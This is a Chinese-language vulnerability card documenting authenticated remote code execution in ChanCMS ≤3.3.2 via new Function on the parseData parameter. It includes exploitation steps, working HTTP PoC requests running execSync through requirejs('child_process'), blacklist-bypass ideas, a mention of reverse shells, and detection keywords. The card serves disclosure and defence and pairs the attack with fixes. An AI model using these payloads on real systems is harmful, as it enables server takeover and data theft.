---
id: web-nodejs-chancms-gather-new-function-code-injection
title: ChanCMS ≤3.3.2 采集接口 new Function 代码注入：parseData 直接作为函数体执行
type: scenario
domain: web
path: web/nodejs
technique: chancms-gather-new-function-code-injection
aliases:
- ChanCMS RCE
- ChanCMS 代码注入
- parseData 注入
- new Function RCE
- /cms/gather/getArticle 注入
- ChanCMS 采集接口 RCE
tags:
- chancms
- nodejs
- code-injection
- new-function
- rce
- parse-data
- requirejs
- child-process
cve: []
severity: critical
confidence: high
status: verified
affected_versions: ChanCMS <= 3.3.2（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T05:59:39+08:00'
  notes: 已对照原文与7张图核对：gather.js 中 new Function('data', parseData) 直接执行 req.query.parseData；路由挂 auth()；img03/05 实测 hasProcess:true、requirejs('fs') 成功，img06 execSync('ip a') 回显网卡列表；卡内无 versions 冲突，按原文标记设置 affected_versions。未验证点：未在本机复现；原文 POC 需可抓取的 targetUrl。
---

## 一句话结论

ChanCMS ≤3.3.2 的后台采集接口 `/cms/gather/getArticle` 从 `req.query` 直接取出 `parseData`，用 `new Function('data', parseData)` 把它编译成函数体并执行；攻击者（后台权限）可让 `parseData` 调用 `requirejs('child_process')` 加载 `child_process`，通过 `execSync` 执行系统命令，并把命令输出放进 JSON 响应，形成完整的后台 RCE。

## 原理

- **危险 sink**：`app/modules/cms/controller/gather.js` 的 `getArticle`/`getA` 从 `req.query` 取 `targetUrl` 与 `parseData`，先 `gather.common(targetUrl)` 抓取目标内容，再执行 `let run = new Function('data', parseData); let dataend = run(data);`。`new Function` 与 `eval` 类似，函数体字符串会被 JavaScript 引擎编译执行，等价于把用户输入当代码运行。
- **无净化**：`parseData` 没有经过任何过滤、白名单或沙箱；系统虽在 `app/middleware/guard.js` 提供 `safeExecuteUserFunction`（用正则黑名单删除 `require|process|import|Buffer|global|eval|Function|exec|spawn` 及 base64 相关函数），但 `getArticle` 根本没有调用它。
- **可达 Node 能力**：该运行时暴露了 `requirejs`（应用内的模块加载别名），因此函数体可以 `requirejs('fs')` 读写文件、`requirejs('child_process')` 加载子进程模块；`child_process.execSync(cmd, {encoding:'utf8'})` 同步执行命令并返回 stdout。
- **回显通道**：控制器把 `dataend` 放进 `res.json({ ..., data: dataend })`，攻击者 `return {success:true, ipResult: ...}` 即可在响应中直接读取命令输出。
- **权限边界**：路由 `router.get("/gather/getArticle", auth(), controller.gather.getArticle)` 带 `auth()`，因此通常需要后台/管理员会话；这是“认证后 RCE”，但仍属于严重漏洞（后台账号泄露、弱口令、CSRF/会话劫持都可放大）。
- **黑名单不足以修复**：原文修复建议改用 `safeExecuteUserFunction`，但其实现仍是正则黑名单 + `new Function`，可通过字符串拼接、`constructor`、编码/间接调用等方式绕过；根本修复应是彻底移除动态代码执行，或改为受限 DSL/白名单解析。

## 触发条件

- ChanCMS 版本 ≤3.3.2，且 `getArticle` 使用 `new Function` 执行 `parseData`。
- 攻击者拥有有效后台会话（`auth()` 通过），或能通过其它方式绕过鉴权/劫持会话。
- 接口可从网络访问；`targetUrl` 能被服务端抓取（否则 `gather.common` 可能先失败）。
- `parseData` 可完整控制，且响应会把执行结果返回（或存在其它回显/外带通道）。

## 利用步骤

1. 登录 ChanCMS 后台，获取有效会话 Cookie/Token。
2. 先发送环境探测 payload，确认 `requirejs`、`process`、`global` 等能力：
   - `parseData` 构造 `const envInfo={}; envInfo.hasRequire = typeof requirejs !== 'undefined'; ...; return {success:true, envInfo};`
3. 观察响应中的 `hasFsViaRequirejs` 等字段；原文探测到 `hasRequire:false`、`hasProcess:true`、`hasFsViaRequirejs:true`。
4. 用 `requirejs('child_process')` 执行命令：`const cp = requirejs('child_process'); const out = cp.execSync('ip a', {encoding:'utf8'}); return {success:true, ipResult: out};`
5. 把命令替换为 `id`、`whoami`、读文件、写文件、反弹 Shell 等；按需用 `requirejs('fs')` 读写文件。
6. 若响应被截断/过滤，可把结果写入文件后通过 Web 访问，或改用外带通道。

## PoC

环境探测：

```http
GET /cms/gather/getArticle?targetUrl=<可抓取URL>&parseData=const%20envInfo%20%3D%20%7B%7D%3B%20envInfo.hasRequire%20%3D%20typeof%20requirejs%20!%3D%3D%20'undefined'%3B%20envInfo.hasProcess%20%3D%20typeof%20process%20!%3D%3D%20'undefined'%3B%20envInfo.hasFsViaRequirejs%20%3D%20false%3B%20try%20%7B%20const%20fs%20%3D%20requirejs('fs')%3B%20envInfo.hasFsViaRequirejs%20%3D%20true%3B%20%7D%20catch(e)%20%7B%7D%20return%20%7Bsuccess%3Atrue%2C%20envInfo%7D%3B HTTP/1.1
Host: target:3000
Cookie: <后台会话>
```

命令执行：

```http
GET /cms/gather/getArticle?targetUrl=<可抓取URL>&parseData=try%7Bconst%20cp%20%3D%20requirejs('child_process')%3Bconst%20ipRes%20%3D%20cp.execSync('ip%20a'%2C%7Bencoding%3A'utf8'%7D)%3Breturn%20%7Bsuccess%3Atrue%2CipResult%3AipRes%7D%3B%7Dcatch(e)%7Breturn%20%7Bsuccess%3Afalse%2Cerror%3Ae.message%7D%3B%7D HTTP/1.1
Host: target:3000
Cookie: <后台会话>
```

解码后的 `parseData`：

```javascript
try {
  const cp = requirejs('child_process');
  const ipRes = cp.execSync('ip a', {encoding: 'utf8'});
  return {success: true, ipResult: ipRes};
} catch (e) {
  return {success: false, error: e.message};
}
```

响应中的 `data.ipResult` 即为命令输出（原文实测返回网卡列表）。

## 变体与关联

- 变体（能力）：`requirejs('fs')` 读写文件、`requirejs('net')` 建连、`requirejs('http')` 内网请求；`process` 可直接读环境变量/`process.mainModule`。
- 变体（绕过黑名单）：若目标改用 `safeExecuteUserFunction`，可尝试字符串拼接规避 `require`/`exec` 关键字、`this.constructor.constructor` 取 Function、`process.binding`、`requirejs` 别名等；不要依赖该黑名单。
- 变体（入口）：除 `/gather/getArticle` 外，任何把用户输入传给 `new Function`/`eval`/`vm` 的控制器方法都可套用。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（Node.js 应用执行用户脚本；n8n 是 vm2 沙箱逃逸，本卡是无沙箱的 `new Function`）。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node.js 原生 vm 逃逸；本卡根本没有沙箱）。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]]（Node.js 应用的另一类用户输入处理风险）。
- 边界：需要后台会话；`targetUrl` 抓取失败可能导致代码执行前就异常；若响应不返回 `dataend`，需要另找回显/外带通道。

## 检测与防御

- 根本修复：移除 `new Function`/`eval` 动态执行；采集功能改为声明式字段映射/受限 DSL，只允许解析 JSON、XPath、CSS 选择器等白名单操作。
- 若必须执行用户脚本：使用独立进程/容器 + 禁用 `require`/`child_process`/`fs` 的最小运行时，并做 AST 白名单；不要仅依赖正则黑名单。
- 权限：采集接口仅对可信管理员开放，增加二次认证/操作审计；后台会话使用强认证与短有效期。
- 输入：`parseData` 与 `targetUrl` 均做严格校验；`targetUrl` 使用域名/IP 白名单，阻断 SSRF。
- 检测：请求参数中出现 `new Function` 语义的特征（`require`、`requirejs`、`child_process`、`execSync`、`process`、`constructor`、`fs.`）；采集接口响应中出现命令输出；Node 进程异常派生 `sh`/`cmd`/`ip`/`whoami` 等子进程；后台账号异常调用采集接口。
- 运营：升级到修复版本；审计所有 `new Function`/`eval`/`vm` 调用点；以非 root 用户运行 Node.js，限制文件系统与出网权限。
